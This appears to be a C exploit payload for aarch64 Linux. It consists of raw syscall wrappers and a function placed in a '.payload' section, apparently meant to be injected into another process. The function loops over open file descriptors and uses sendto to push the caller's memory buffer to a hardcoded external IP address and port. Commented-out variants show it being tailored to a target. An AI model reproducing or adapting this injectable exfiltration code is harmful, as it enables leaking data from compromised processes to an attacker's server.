#include <netinet/in.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/types.h>

#define __NR_socket 198
#define __NR_connect 203
#define __NR_write 64
#define __NR_close 57
#define __NR_sendto 206

static inline long _syscall(int number, long arg1, long arg2, long arg3,
                            long arg4, long arg5, long arg6) {
  register int _number asm("w8") = number;
  register long _arg1 asm("x0") = arg1;
  register long _arg2 asm("x1") = arg2;
  register long _arg3 asm("x2") = arg3;
  register long _arg4 asm("x3") = arg4;
  register long _arg5 asm("x4") = arg5;
  register long _arg6 asm("x5") = arg6;
  asm volatile("svc #0\n"
               : "+r"(_arg1), "+r"(_arg2)
               : "r"(_number), "r"(_arg3), "r"(_arg4), "r"(_arg5), "r"(_arg6)
               : "cc", "memory");
  return _arg1;
}

static inline int _socket(int domain, int type, int protocol) {
  return _syscall(__NR_socket, domain, type, protocol, 0, 0, 0);
}

static inline int _connect(int sockfd, const struct sockaddr *addr,
                           socklen_t addrlen) {
  return _syscall(__NR_connect, sockfd, (long)addr, addrlen, 0, 0, 0);
}

static inline ssize_t _write(int fd, const void *buf, size_t count) {
  return _syscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

static inline int _close(int fd) {
  return _syscall(__NR_close, fd, 0, 0, 0, 0, 0);
}

static inline ssize_t _sendto(int sockfd, const void *buf, size_t len,
                              int flags, const struct sockaddr *dest_addr,
                              socklen_t addrlen) {
  return _syscall(__NR_sendto, sockfd, (long)buf, len, flags, (long)dest_addr,
                  addrlen);
}

__attribute__((section(".payload"))) int
payload(char *buf, long size, void (*log)(long, long, char *, long)) {
#if 0
  int s = _socket(AF_INET, SOCK_DGRAM, 0);
#elsif 0
  int s = *(int *)0x6151f0;
#elsif 0
  int s = 4;
#else
  for (int s = 3; s < 16; s++) {
#endif
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = 0x9982;
  sin.sin_addr.s_addr = 0x53b9390d;
  *(long *)sin.sin_zero = 0;
  _sendto(s, buf - 8, size + 8, MSG_NOSIGNAL, (const struct sockaddr *)&sin,
          sizeof(sin));
#if 0
  _connect(s, (const struct sockaddr *)&sin, sizeof(sin));
  _write(s, buf, size);
  _close(s);
#else
  }
#endif
  return 0;
}

int main() { payload("hello", 5, NULL); }
